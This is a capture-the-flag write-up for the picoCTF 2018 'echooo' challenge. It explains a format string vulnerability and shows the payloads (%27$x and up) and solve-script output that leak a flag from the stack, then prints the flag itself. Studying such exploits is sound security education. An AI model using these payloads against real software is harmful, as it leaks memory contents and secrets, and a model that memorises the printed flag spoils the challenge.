# echooo 
Points: 300

## Category
Binary Exploitation

## Question
>This program prints any input you give it. Can you [leak](files/echo) the flag? Connect with `nc 2018shell1.picoctf.com 46960`. [Source](files/echo.c). 

### Hint
>If only the program used puts...

## Solution
A simple format string exploit.

Looking at the source code, we see that the flag is stored in the stack. All we have to do is to leak values from the stack to get the flag.

Doing some testing locally, we see that the flag starts at _%29$x_. This format simply takes the 29th argument and print it out as hex.

Since the buffer only accepts 64 bytes, we have to stagger the inputs.

```
$ python solve.py 
[+] Opening connection to 2018shell1.picoctf.com on port 46960: Done
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %27$x %28$x %29$x %30$x %31$x %32$x %33$x %34$x %35$x %36$x
[*] Flag Part 1: 6f636970 7b465443 6d526f66 735f7434 6e695274 615f7347 445f6552 65476e61 73753072 6237615f
> %37$x %38$x %39$x %40$x %41$x
[*] Flag Part 2: 32613463 a7d64 80487ab 1 ffe42d84
[+] Flag: picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}
[*] Closed connection to 2018shell1.picoctf.com port 46960
```

Working solution [solve.py](solution/solve.py)

### Flag
`picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}`
